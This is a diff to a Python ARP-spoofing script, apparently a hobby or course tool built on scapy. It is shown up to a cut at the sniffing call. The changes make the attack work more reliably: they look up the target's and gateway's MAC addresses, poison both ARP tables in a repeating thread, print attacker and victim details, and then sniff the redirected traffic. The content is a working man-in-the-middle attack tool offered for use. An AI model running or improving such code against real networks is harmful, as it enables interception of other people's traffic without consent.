@@ -16,7 +16,9 @@ options = {
         "src": None , #attack source
         "router" : None , #my router
         "mac ":None , #my mac
-        "ip" : None #my ip 
+        "ip" : None , #my ip 
+        "targetMac" : None,
+        "routerMac" : None
     } 
 
 def main(argv :list )->None:
@@ -24,11 +26,11 @@ def main(argv :list )->None:
     usage: ArpSpoofer.py [-h] [-i IFACE] [-s SRC] [-d DELAY] [-gw]
             -t TARGET
     !!! - use sudo!
-    Purpose: Spoof ARP tables. This attack make the target think that "src address"
+    Purpose: Spoof ARP tables. This attack make the target think that "src"
     is associated with the attacker MAC address. Thus, the attacker will get all
     messages from the target to "src adderss".
     setting the -gw option will cause to spoof also the gateway, to make it think
-    that "target ip" is associated with ttacker MAC address.
+    that "target ip" is associated with attacker MAC address.
     optional arguments:
         -h, --help          show this help message and exit
         -i IFACE, --iface IFACE
@@ -42,10 +44,10 @@ def main(argv :list )->None:
     '''
     def redoit(source):
         while(True):
-            arpUtil.changeArpTable(options["target"], source  ,options["mac"], options["interface"] )
+            arpUtil.changeArpTable(options["target"], options["targetMac"], source  ,options["mac"], options["interface"] )
             if(options["attackGW"]):
-                arpUtil.changeArpTable(options["router"] ,options["target"] , options["mac"],options["interface"] )
-            time.sleep(10)
+                arpUtil.changeArpTable(options["router"], options["routerMac"], options["target"] , options["mac"],options["interface"] )
+            time.sleep(options["delay"])
     try:
         opts, args = getopt.getopt(argv, "s:t:d:i:gw:h", [
                                     "src=","delay=","target=","iface=","gateway","help"])
@@ -62,21 +64,32 @@ def main(argv :list )->None:
         elif opt in ("-s", "--src"):
             options["src"] = arg
         elif opt in ("-d", "--delay"):
-            options["delay"] = arg
-        elif opt in ("-gw", "--getway"):
+            options["delay"] = float(arg)
+        elif opt in ("-gw", "--gateway"):
             options["attackGW"] = True
         elif opt in ("-t", "--target"):
             options["target"] = arg
 
  
+    options["targetMac"] = arpUtil.getTargetMac(options["target"], options["interface"])
     options["router"] = next(filter(lambda x : x[3] == options["interface"] , dict(conf.route.__dict__)["routes"]))[2]
+    options["routerMac"] = arpUtil.getTargetMac(options["router"], options["interface"])
     options["mac"]=get_if_hwaddr(options["interface"])
     options["ip"]= get_if_addr(options["interface"])
-    #the attack 
-    
-    
+
+    print("Target info---------")
+    print("IP:", options["target"])
+    print("MAC: ", options["targetMac"])
+    print("Attacker info---------")
+    print("IP:", options["ip"])
+    print("MAC: ", options["mac"])
     source = options["src"] if options["src"] else options["router"]
-    print(source)
+    print("Spoofing message to target: ", source, "is at", options["mac"])
+    if options["attackGW"]:
+        print("+ Spoofing message to router: ", options["target"], "is at ", options["mac"])
+    print("\n\n")
+
+    #the attack 
     tr = threading.Thread(target=redoit , args=(source,))
     tr.start()
     sniff(
